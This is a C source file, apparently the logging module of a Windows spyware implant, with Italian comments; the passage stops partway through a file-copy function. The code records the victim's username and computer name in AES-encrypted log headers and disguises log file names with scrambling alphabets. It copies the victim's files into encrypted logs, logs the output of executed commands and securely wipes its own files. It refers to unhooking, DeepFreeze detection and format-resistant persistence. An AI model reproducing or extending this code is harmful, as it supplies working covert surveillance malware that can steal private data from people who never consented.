#include <windows.h>
#include <time.h>
#include <stdio.h>
#include "common.h"
#include "ASP.h"
#include "LOG.h"
#include "H4-DLL.h"
#include "aes_alg.h"
#include "sha1.h"
#include "md5.h"
#include "explore_directory.h"
#include "x64.h"
#include "JSON\JSON.h"
#include "UnHookClass.h"
#include "DeepFreeze.h"
#include "format_resistant.h"

extern BOOL IsDriverRunning(WCHAR *driver_name);
extern char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];

typedef struct {
	DWORD agent_tag;
	HANDLE h_file;
} log_entry_struct;

typedef struct log_list {
	nanosec_time ftime;
	char *file_name;
	DWORD size;
	struct log_list* next;
} log_list_struct;

log_list_struct *log_list_head = NULL;

//
// Struttura dei log file
//
// C'e' una dword in chiaro che indica: sizeof(LogStruct) + uDeviceIdLen + uUserIdLen + uSourceIdLen + uAdditionalData
typedef struct _LogStruct{
	UINT uVersion;			// Versione della struttura
		#define LOG_VERSION	2008121901
	UINT uLogType;			// Tipo di log
	UINT uHTimestamp;		// Parte alta del timestamp
	UINT uLTimestamp;		// Parte bassa del timestamp
	UINT uDeviceIdLen;		// IMEI/Hostname len
	UINT uUserIdLen;		// IMSI/Username len
	UINT uSourceIdLen;		// Numero del caller/IP len	
	UINT uAdditionalData;	// Lunghezza della struttura addizionale, se presente
}LogStruct, *pLogStruct;

#define NO_TAG_ENTRY 0xFFFFFFFF
#define MAX_LOG_ENTRIES 70
#define MIN_CREATION_SPACE 307200 // Numero di byte che devono essere rimasti per creare ancora nuovi file di log
log_entry_struct log_table[MAX_LOG_ENTRIES];

// Dichiarato in SM_EventHandlers.h
extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
extern BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line);

// Dichiarato in SM_ActionFunctions.h
extern BOOL WINAPI DA_Execute(BYTE *command);

// In BitmapCommon
extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
extern BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back);

extern aes_context crypt_ctx; // Dichiarata in shared
extern aes_context crypt_ctx_conf; // Dichiarata in shared

extern BYTE crypt_key[KEY_LEN]; // Dichiarata in shared
extern BYTE crypt_key_conf[KEY_LEN]; // Dichiarata in shared

BOOL log_wipe_file = FALSE; // Indica se sovrascrive un file prima di cancellarlo
DWORD min_disk_free = 0;    // Spazio minimo che deve rimanere su disco (configurabile)
DWORD max_disk_full = 0;    // Spazio massimo occupabile dai log
extern DWORD log_free_space; // Dichiarata nel segmento shared
extern DWORD log_active_queue;

extern BOOL IsDeepFreeze();

#define LOG_SIZE_MAX ((DWORD)1024*1024*100) //100MB
DWORD GetLogSize(char *path)
{
	DWORD hi_dim=0, lo_dim=0;
	HANDLE hfile;

	hfile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) 
		return 0xFFFFFFFF;
	lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
	CloseHandle(hfile);
	if (lo_dim == INVALID_FILE_SIZE || hi_dim>0)
		return 0xFFFFFFFF;
	return lo_dim;
}

// Inserisce un elemento nella lista dei log da spedire in ordine di tempo
BOOL InsertLogList(log_list_struct **log_list, WIN32_FIND_DATA *log_elem)
{
	log_list_struct *new_elem;

	// Alloca e inizializza il nuovo elemento
	if ( !(new_elem = (log_list_struct *)malloc(sizeof(log_list_struct))) )
		return FALSE;
	if ( !(new_elem->file_name = (char *)strdup(log_elem->cFileName)) ) {
		SAFE_FREE(new_elem);
		return FALSE;
	}
	new_elem->ftime.hi_delay = log_elem->ftCreationTime.dwHighDateTime;
	new_elem->ftime.lo_delay = log_elem->ftCreationTime.dwLowDateTime;
	new_elem->size = log_elem->nFileSizeLow;

	// Cerca l'elemento dove va inserito
	while (*log_list) {
		// Se abbiamo trovato il posto giusto si ferma
		if (!IsGreaterDate(&(new_elem->ftime), &((*log_list)->ftime)))
			break;
		// Continua a scorrere la lista
		log_list = &( (*log_list)->next );
	}

	new_elem->next = *log_list;
	*log_list = new_elem;
	
	return TRUE;
}

// Libera la lista dei log
void FreeLogList(log_list_struct **log_list)
{
	log_list_struct *list_ptr, *tmp_ptr;
	list_ptr = *log_list;
	while(list_ptr) {
		SAFE_FREE(list_ptr->file_name);
		tmp_ptr = list_ptr->next;
		SAFE_FREE(list_ptr);
		list_ptr = tmp_ptr;
	}
	*log_list = NULL;
}

// Fa una pausa random in un intervallo (in secondi)
#define MAX_SLEEP_PAUSE 10
void LOG_SendPause(DWORD min_sleep, DWORD max_sleep)
{
	DWORD sleep_time;

	if (min_sleep > MAX_SLEEP_PAUSE)
		min_sleep = MAX_SLEEP_PAUSE;

	if (max_sleep > MAX_SLEEP_PAUSE)
		max_sleep = MAX_SLEEP_PAUSE;

	if (min_sleep > max_sleep || max_sleep == 0)
		return;

	srand((DWORD)time(NULL));
	rand();
	sleep_time = (((double)rand()/(double)RAND_MAX) * (max_sleep-min_sleep) + min_sleep);
	sleep_time*=1000;
	Sleep(sleep_time);
}

// Inizializza la chiave di cifratura.
void LOG_InitCryptKey(BYTE *crypt_material, BYTE *crypt_material_conf)
{
	// Chiave per i log
	memcpy(crypt_key, crypt_material, KEY_LEN);
	aes_set_key( &crypt_ctx, crypt_material, KEY_LEN*8 );

	// Chiave per la conf
	memcpy(crypt_key_conf, crypt_material_conf, KEY_LEN);
	aes_set_key( &crypt_ctx_conf, crypt_material_conf, KEY_LEN*8 );
}

void WINAPI ParseGlobalsQuota(JSONObject conf_json, DWORD dummy)
{
	JSONObject quota;
	
	if (!conf_json[L"quota"]->IsObject())
		return;

	quota = conf_json[L"quota"]->AsObject();
	min_disk_free = (DWORD) quota[L"min"]->AsNumber();
	max_disk_full = (DWORD) quota[L"max"]->AsNumber();
	log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
	SetFormatResistant(conf_json[L"format"]->AsBool());
}

// Legge la configuazione per i log
// (viene letto solo quando inizializza i log e
// non sulla ricezione di un nuovo file)
void UpdateLogConf()
{
	char *conf_memory;
	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
	if (conf_memory)
		HM_ParseConfGlobals(conf_memory, &ParseGlobalsQuota);
	SAFE_FREE(conf_memory);	
}


// Sottrae due large integer (con a>b)
void LargeSubtract(const ULARGE_INTEGER *a,
				   const ULARGE_INTEGER *b,
				   ULARGE_INTEGER *result)
{
	if (a->LowPart >= b->LowPart) {
		result->LowPart = a->LowPart - b->LowPart;
		result->HighPart = a->HighPart - b->HighPart;
	} else {
		result->LowPart = (0xffffffff - b->LowPart);
		result->LowPart += 1 + a->LowPart;
		result->HighPart = a->HighPart - b->HighPart - 1;
	}
}


// Torna lo spazio destinato ai log.
// Il minimo spazio libero richiedibile e' massimo 4GB.
// Lo spazio occupabile dai log e' massimo 4GB.
DWORD LOG_CalcSpace(ULARGE_INTEGER *large_space, DWORD space_req)
{
	ULARGE_INTEGER large_req;
	ULARGE_INTEGER result;

	// Se lo spazio richiesto e' maggiore, ritorna 0
	if (large_space->HighPart == 0 && large_space->LowPart <= space_req)
		return 0;

	// Se lo spazio richiesto e' minore, sottrae
	large_req.HighPart = 0;
	large_req.LowPart = space_req;
	LargeSubtract(large_space, &large_req, &result);

	// Se il risultato e' > di 4GB, ritorna 4GB
	if (result.HighPart>0)
		return 0xFFFFFFFF;

	// Altrimenti torna la parte bassa
	return result.LowPart;
}

// Calcola la dimensione della directory di lavoro
// Se fallisce torna che la directory occupa 4GB
DWORD LOG_GetActualLogSize()
{
	DWORD log_total_size = 0xFFFFFFFF;
	char DirSpec[MAX_PATH];  
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	HM_CompletePath("*", DirSpec);
	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		log_total_size = 0;
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;
			
			if (FindFileData.nFileSizeLow != INVALID_FILE_SIZE)
				log_total_size += FindFileData.nFileSizeLow;
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
	return log_total_size;
}

void LOG_InitSequentialLogs()
{
	DWORD i;

	// Inizializza la tabella dei log
	for (i=0; i<MAX_LOG_ENTRIES; i++) {
		log_table[i].agent_tag = NO_TAG_ENTRY;
		log_table[i].h_file = INVALID_HANDLE_VALUE;
	}
}

// Inizializza l'utilizzo dei log
void LOG_InitLog()
{
	ULARGE_INTEGER temp_free_space;
	char disk_path[DLLNAMELEN];
	DWORD temp_log_space;
	DWORD allowed_size1 = 0;
	DWORD allowed_size2 = 0;

	log_active_queue = 0;

	// Legge la configurazione dei log
	UpdateLogConf();

	LOG_InitSequentialLogs();

	// Inizializza lo spazio rimanente sul disco
	// dove e' la directory di lavoro
	// (min disk free)
	if (FNC(GetDiskFreeSpaceExA)(HM_CompletePath("", disk_path), NULL, NULL, &temp_free_space))
		allowed_size1 = LOG_CalcSpace(&temp_free_space, min_disk_free);	

	// Inizializza lo spazio ancora a disposizione per i log
	// (max disk full)
	temp_log_space = LOG_GetActualLogSize();
	if (max_disk_full >= temp_log_space)
		allowed_size2 = max_disk_full - temp_log_space;

	// Lo spazio libero e' la condizione piu' stringente
	// fra le due sopra
	// (se qualcosa va storto log_free_space = 0)
	if (allowed_size1 < allowed_size2)
		log_free_space = allowed_size1;
	else
		log_free_space = allowed_size2;
}


// Crea l'header per il nuovo formato di log
// l'header poi va LIBERATO!
BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_len, DWORD *out_len)
{
	FILETIME tstamp;
	WCHAR user_name[256];
	WCHAR host_name[256];
	DWORD header_len;
	DWORD padded_len;
	BYTE iv[BLOCK_LEN];
	BYTE *final_header, *ptr;
	LogStruct log_header;

	if (out_len)
		*out_len = 0;

	// Calcola i campi da mettere nell'header
	memset(user_name, 0, sizeof(user_name));
	memset(host_name, 0, sizeof(host_name));
	user_name[0]=L'-';
	host_name[0]=L'-';
	FNC(GetEnvironmentVariableW)(L"USERNAME", (WCHAR *)user_name, sizeof(user_name)/2-2);	
	FNC(GetEnvironmentVariableW)(L"COMPUTERNAME", (WCHAR *)host_name, sizeof(host_name)/2-2);
	FNC(GetSystemTimeAsFileTime)(&tstamp);

	// Riempie l'header
	log_header.uDeviceIdLen = wcslen(host_name)*sizeof(WCHAR);
	log_header.uUserIdLen   = wcslen(user_name)*sizeof(WCHAR);
	log_header.uSourceIdLen = 0;
	if (additional_data) 
		log_header.uAdditionalData = additional_len;
	else
		log_header.uAdditionalData = 0;
	log_header.uVersion = LOG_VERSION;
	log_header.uHTimestamp = tstamp.dwHighDateTime;
	log_header.uLTimestamp = tstamp.dwLowDateTime;
	log_header.uLogType = agent_tag;

	// Calcola la lunghezza totale dell'header e il padding
	header_len = sizeof(LogStruct) + log_header.uDeviceIdLen + log_header.uUserIdLen + log_header.uSourceIdLen + log_header.uAdditionalData;
	padded_len = header_len;
	if (padded_len % BLOCK_LEN) {
		padded_len /= BLOCK_LEN;
		padded_len++;
		padded_len *= BLOCK_LEN;
	}
	padded_len += sizeof(DWORD);
	if (padded_len < header_len)
		return NULL;
	final_header = (BYTE *)malloc(padded_len);
	if (!final_header)
		return NULL;
	ptr = final_header;

	// Scrive l'header
	header_len = padded_len - sizeof(DWORD);
	memcpy(ptr, &header_len, sizeof(DWORD));
	ptr += sizeof(DWORD);
	memcpy(ptr, &log_header, sizeof(log_header));
	ptr += sizeof(log_header);
	memcpy(ptr, host_name, log_header.uDeviceIdLen);
	ptr += log_header.uDeviceIdLen;
	memcpy(ptr, user_name, log_header.uUserIdLen);
	ptr += log_header.uUserIdLen;
	if (additional_data)
		memcpy(ptr, additional_data, additional_len);

	// Cifra l'header (la prima DWORD e' in chiaro)
	memset(iv, 0, sizeof(iv));
	aes_cbc_encrypt(&crypt_ctx, iv, final_header+sizeof(DWORD), final_header+sizeof(DWORD), padded_len-sizeof(DWORD));
	if (out_len)
		*out_len = padded_len;
	
	return final_header;
}


void PrintBinary(WORD number, char *output)
{
	DWORD i = 0;
	sprintf(output, "0000000000000000");
	while (number) {
		if (number & 1)
			output[i] = '1';
		i++;
		number >>= 1;
	}
}

// Inizializza l'uso dei log per un agente
// (non e' thread safe)
// Torna TRUE se ha successo
BOOL LOG_InitAgentLog(DWORD agent_tag)
{
	DWORD i;
	HANDLE h_file;
	char log_wout_path[128];
	char file_name[DLLNAMELEN];
	char binary_tag[64];
	char *scrambled_name;
	BOOL newly_created;

	// Controlla che il TAG non sia gia' presente
	for (i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == agent_tag)
			return TRUE;

	// Cerca una entry vuota e la riempie (solo se 
	// riesce ad aprire il file)
	for(i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == NO_TAG_ENTRY) {
			ZeroMemory(binary_tag, sizeof(binary_tag));
			PrintBinary(agent_tag, binary_tag);
			sprintf(log_wout_path, "%.1XLOG%s%s.log", log_active_queue, binary_tag, SHARE_MEMORY_READ_NAME);

			if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
				return FALSE;			
			HM_CompletePath(scrambled_name, file_name);
			SAFE_FREE(scrambled_name);

			h_file = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, 0, NULL);
			if (h_file == INVALID_HANDLE_VALUE) 
				return FALSE;
			if (GetLastError() == ERROR_ALREADY_EXISTS )
				newly_created = FALSE;
			else
				newly_created = TRUE;
			FNC(SetFilePointer)(h_file, 0, NULL, FILE_END);
			
			// Se e' un file nuovo, ci inserisc l'header
			if (newly_created) {
				DWORD out_len, dummy;
				BYTE *log_header;
				
				log_header = Log_CreateHeader(agent_tag, NULL, 0, &out_len);
				if (!log_header || log_free_space<out_len || !FNC(WriteFile)(h_file, log_header, out_len, &dummy, NULL)) {
					CloseHandle(h_file);
					SAFE_FREE(log_header);
					FNC(DeleteFileA)(file_name);
					return FALSE;
				}
				SAFE_FREE(log_header);
				if (log_free_space >= out_len)
					log_free_space -= out_len;
				FNC(FlushFileBuffers)(h_file);
			}
			
			log_table[i].h_file = h_file;
			log_table[i].agent_tag = agent_tag;
			return TRUE;
		}

	return FALSE;
}


// Stoppa l'uso dei log per un agente
void LOG_StopAgentLog(DWORD agent_tag)
{
	DWORD i;

	// Cerca il TAG giusto
	for (i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == agent_tag) {
			log_table[i].agent_tag = NO_TAG_ENTRY;
			CloseHandle(log_table[i].h_file);
			log_table[i].h_file = INVALID_HANDLE_VALUE;
			return;
		}
}


// Offusca un log. Ritorna il buffer cifrato (che andra' liberato)
// Compatibile con il nuovo formato di file
BYTE *LOG_Obfuscate(BYTE *buff, DWORD buff_len, DWORD *crypt_len)
{
	DWORD *ptr;       // Indice nel buffer cifrato
	BYTE *crypt_buff;
	DWORD tot_len;
	DWORD i;
	BYTE iv[BLOCK_LEN];

	// Il buffer sara' composto cosi':
	// DWORD original_len (in chiaro)
	// buffer (cifrato)
	// padding (in modo che tutto sia multiplo di 16 byte)
	tot_len = buff_len;
	if (tot_len % BLOCK_LEN) {
		tot_len /= BLOCK_LEN;
		tot_len++;
		tot_len *= BLOCK_LEN;
	}
	tot_len += sizeof(DWORD);

	// Check overflow
	if (tot_len < buff_len)
		return NULL;

	// Alloca il buffer
	crypt_buff = (BYTE *)malloc(tot_len);
	if (!crypt_buff)
		return NULL;

	*crypt_len = tot_len;

	// Copia la lunghezza originale 
	ptr = (DWORD *)crypt_buff;
	*ptr = buff_len;
	ptr++;

	// Copia il buffer in chiaro (rimarranno dei byte di padding
	// inutilizzati).
	memcpy(ptr, buff, buff_len);
	memset(iv, 0, sizeof(iv));

	// Cifra tutto il blocco
	aes_cbc_encrypt(&crypt_ctx, iv, (BYTE *)ptr, (BYTE *)ptr, tot_len-sizeof(DWORD));

	return crypt_buff;
}


// Scrive un a entry nel file di log corrispondente
BOOL LOG_ReportLog(DWORD agent_tag, BYTE *buff, DWORD buff_len)
{
	DWORD i;
	
	// Cerca il TAG giusto
	for (i=0; i<MAX_LOG_ENTRIES; i++) 
		if (log_table[i].agent_tag == agent_tag) 
			return Log_WriteFile(log_table[i].h_file, buff, buff_len);

	return FALSE;
}


// Effettua lo scrambling e il descrimbling di una stringa
// Ricordarsi di liberare la memoria allocata
// E' Thread SAFE
char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt)
{
	char alphabet[ALPHABET_LEN]={'_','B','q','w','H','a','F','8','T','k','K','D','M',
		                         'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
		                         'i','b','U','I','e','y','l','J','W','h','j','0','m',
                                 '5','o','2','E','r','L','t','6','v','G','R','N','9',
					             's','Y','1','n','3','P','p','c','7','g','-','C'};                  
	char *ret_string;
	DWORD i,j;

	if ( !(ret_string = _strdup(string)) )
		return NULL;

	// Evita di lasciare i nomi originali anche se il byte e' 0
	scramble%=ALPHABET_LEN;
	if (scramble == 0)
		scramble = 1;

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				// Se crypt e' TRUE cifra, altrimenti decifra
				if (crypt)
					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				else
					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

char *LOG_ScrambleName2(char *string, BYTE scramble, BOOL crypt)
{
	char alphabet[ALPHABET_LEN]={'a','_','q','T','w','B','H','W','K','F','D','M','k',		                      
		                         'i','U','m','I','e','l','J','8','y','h','j','b','0',
								 'f','4','z','Q','O','9','S','x','u','X','A','V','Z',
                                 '3','7','2','E','L','r','t','G','6','v','C','N','d',
					             's','5','p','o','Y','n','1','c','g','P','R','-'};                  
	char *ret_string;
	DWORD i,j;

	if ( !(ret_string = _strdup(string)) )
		return NULL;

	// Evita di lasciare i nomi originali anche se il byte e' 0
	scramble%=ALPHABET_LEN;
	if (scramble == 0)
		scramble = 1;

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				// Se crypt e' TRUE cifra, altrimenti decifra
				if (crypt)
					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				else
					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

// --- Funzioni per far creare file agli agenti ---
// DEVONO ESSERE TUTTE THREAD SAFE

// Crea un file di log col nuovo formato
HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional_len)
{
	char log_wout_path[128];
	char file_name[DLLNAMELEN];
	char *scrambled_name;
	FILETIME time_nanosec;
	DWORD out_len, dummy;
	BYTE *log_header;
	HANDLE hfile;
#define MAX_FILE_RETRY_COUNT 20
	DWORD retry_count = 0;

	// Controlla che ci sia ancora spazio per scrivere su disco
	// (additional_len e' l'unica parte di lunghezza variabile dell'header)
	if (log_free_space <= MIN_CREATION_SPACE + additional_len) 
		return INVALID_HANDLE_VALUE;

	// Usa l'epoch per dare un nome univoco al file
	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	

	// Fa piu' tentativi ogni volta cambiando il nome del file
	// data la scarsa granularita' del systemtime
	do {
		retry_count++;
		if (retry_count > MAX_FILE_RETRY_COUNT)
			return INVALID_HANDLE_VALUE;

		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%.8X%.8X.log", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
			return INVALID_HANDLE_VALUE;	
		HM_CompletePath(scrambled_name, file_name);
		SAFE_FREE(scrambled_name);

		hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 

		// Incrementa di 1 il timestamp se deve riprovare
		time_nanosec.dwLowDateTime++;
		if (time_nanosec.dwLowDateTime == 0) // il riporto
			time_nanosec.dwHighDateTime++;
	} while (hfile == INVALID_HANDLE_VALUE);

	// Scrive l'header nel file
	log_header = Log_CreateHeader(agent_tag, additional_header, additional_len, &out_len);
	if (!log_header || log_free_space<out_len || !FNC(WriteFile)(hfile, log_header, out_len, &dummy, NULL)) {
		SAFE_FREE(log_header);
		CloseHandle(hfile);
		FNC(DeleteFileA)(file_name);
		return INVALID_HANDLE_VALUE;
	}
	SAFE_FREE(log_header);
	// ...e sottrae dalla quota disco
	if (log_free_space >= out_len)
		log_free_space -= out_len;
	FNC(FlushFileBuffers)(hfile);

	return hfile;
}

// Usato per l'output dei comandi
// N.B. Non sottrae quota disco!
HANDLE Log_CreateOutputFile(char *command_name)
{
	char log_wout_path[128];
	char file_name[DLLNAMELEN];
	char *scrambled_name;
	FILETIME time_nanosec;
	DWORD out_len, dummy;
	BYTE *log_header;
	HANDLE hfile;
	SECURITY_ATTRIBUTES sa;

	// Controlla che ci sia ancora spazio per scrivere su disco
	if (log_free_space <= MIN_CREATION_SPACE) 
		return INVALID_HANDLE_VALUE;

	// Usa l'epoch per dare un nome univoco al file
	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	

	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "OUTF%.8X%.8X.log", time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
	if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) )
		return INVALID_HANDLE_VALUE;	
	HM_CompletePath(scrambled_name, file_name);
	SAFE_FREE(scrambled_name);

	sa.bInheritHandle = TRUE;
	sa.nLength = 0;
	sa.lpSecurityDescriptor = NULL;
	hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ, &sa, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hfile == INVALID_HANDLE_VALUE)
		return INVALID_HANDLE_VALUE;

	// Scrive l'header nel file
	log_header = Log_CreateHeader(PM_COMMANDEXEC, (BYTE *)command_name, strlen(command_name) + 1, &out_len);
	if (!log_header || log_free_space<out_len || !FNC(WriteFile)(hfile, log_header, out_len, &dummy, NULL)) {
		SAFE_FREE(log_header);
		CloseHandle(hfile);
		FNC(DeleteFileA)(file_name);
		return INVALID_HANDLE_VALUE;
	}
	SAFE_FREE(log_header);
	FNC(FlushFileBuffers)(hfile);

	return hfile;
}


// Chiude un file di log
void Log_CloseFile(HANDLE handle)
{
	if (handle != INVALID_HANDLE_VALUE)
		CloseHandle(handle);
}


// Cancella tutti i file di log
void Log_RemoveFiles()
{
	char log_file[DLLNAMELEN];
	WIN32_FIND_DATA FindFileData;
	char DirSpec[MAX_PATH];  
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Cerca tutti i file nella directory di lavoro tranne
	// il core e il file di configurazione
	HM_CompletePath("*", DirSpec);
	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			// Cancella i file che non sono il core o il file di conf
			if (stricmp(FindFileData.cFileName, H4DLLNAME) && stricmp(FindFileData.cFileName, H4_CONF_FILE))
				HM_WipeFileA(HM_CompletePath(FindFileData.cFileName, log_file));
		} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
		FNC(FindClose)(hFind);
	}
}


// Salva lo stato di un agente
BOOL Log_SaveAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
{
	char conf_name[128];
	char conf_path[DLLNAMELEN];
	char *scrambled_name;
	HANDLE hf;
	DWORD dwWrt = 0;

	// Il formato del nome e' ACFG<agent>.bin
	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
		return FALSE;
	
	HM_CompletePath(scrambled_name, conf_path);
	SAFE_FREE(scrambled_name);

	hf = FNC(CreateFileA)(conf_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hf == INVALID_HANDLE_VALUE)
		return FALSE;

	// Verifica che abbia scritto tutto
	if (!FNC(WriteFile)(hf, conf_buf, conf_len, &dwWrt,  NULL) || dwWrt!=conf_len) {
		CloseHandle(hf);
		return FALSE;
	}

	CloseHandle(hf);
	return TRUE;
}

// Carica lo stato di un agente
BOOL Log_RestoreAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
{
	char conf_name[128];
	char conf_path[DLLNAMELEN];
	char *scrambled_name;
	HANDLE hf;
	DWORD dwRd = 0;

	// Il formato del nome e' ACFG<agent>.bin
	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
	if ( ! (scrambled_name = LOG_ScrambleName2(conf_name, crypt_key[0], TRUE)) ) 
		return FALSE;
	
	HM_CompletePath(scrambled_name, conf_path);
	SAFE_FREE(scrambled_name);

	hf = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hf == INVALID_HANDLE_VALUE)
		return FALSE;

	// Verifica che abbia scritto tutto
	if (!FNC(ReadFile)(hf, conf_buf, conf_len, &dwRd,  NULL) || dwRd!=conf_len) {
		CloseHandle(hf);
		return FALSE;
	}

	CloseHandle(hf);
	return TRUE;
}



// Copia il file in modo offuscato (aggiornando la quota
// disco anche in caso di sovrascritture).
#define CRYPT_COPY_BUF_LEN 102400
BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD agent_tag)
{
	HANDLE hsrc, hdst;
	BY_HANDLE_FILE_INFORMATION dst_info;
	DWORD existent_file_size = 0;
	DWORD dwRead;
	BYTE *temp_buff;
	BYTE *file_additional_data;
	BYTE *log_file_header;
	FileAdditionalData *file_additiona_data_header;
	DWORD header_len;
	WCHAR *to_display;

	if (display_name)
		to_display = display_name;
	else
		to_display = src_path;

	// Crea l'header da scrivere nel file
	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
		return FALSE;
	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
	SAFE_FREE(file_additional_data);
	if (!log_file_header)
		return FALSE;
	

	// Prende le info del file destinazione (se esiste)
	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hdst != INVALID_HANDLE_VALUE) {
		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
			existent_file_size = dst_info.nFileSizeLow;
		}
		CloseHandle(hdst);
	}

	if ( !(temp_buff = (BYTE *)malloc(CRYPT_COPY_BUF_LEN)) ) {
		SAFE_FREE(log_file_header);
		return FALSE;
	}

	hsrc = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hsrc == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		return FALSE;
	}

	// Controlla che ci sia ancora spazio per scrivere su disco
	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
		SAFE_FREE(temp_buff);
		SAFE_FREE(log_file_header);
		CloseHandle(hsrc);
		return FALSE;
	}

	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		CloseHandle(hsrc);
		return FALSE;
	}
	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
	// recuperata.
	log_free_space += existent_file_size;

	// Scrive l'header nel file
	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
		CloseHandle(hsrc);
		CloseHandle(hdst);
		SAFE_FREE(log_file_header);
		SAFE_FREE(temp_buff);
		return FALSE;
	}
	if (log_free_space >= header_len)
		log_free_space -= header_len;
	SAFE_FREE(log_file_header);
	FNC(FlushFileBuffers)(hdst);

	// Cicla finche riesce a leggere (e/o a scrivere)
	LOOP {
		dwRead = 0;
		if (!FNC(ReadFile)(hsrc, temp_buff, CRYPT_COPY_BUF_LEN, &dwRead, NULL) )
			break;
		// La Log_WriteFile sottrae la quota disco di ogni scrittura
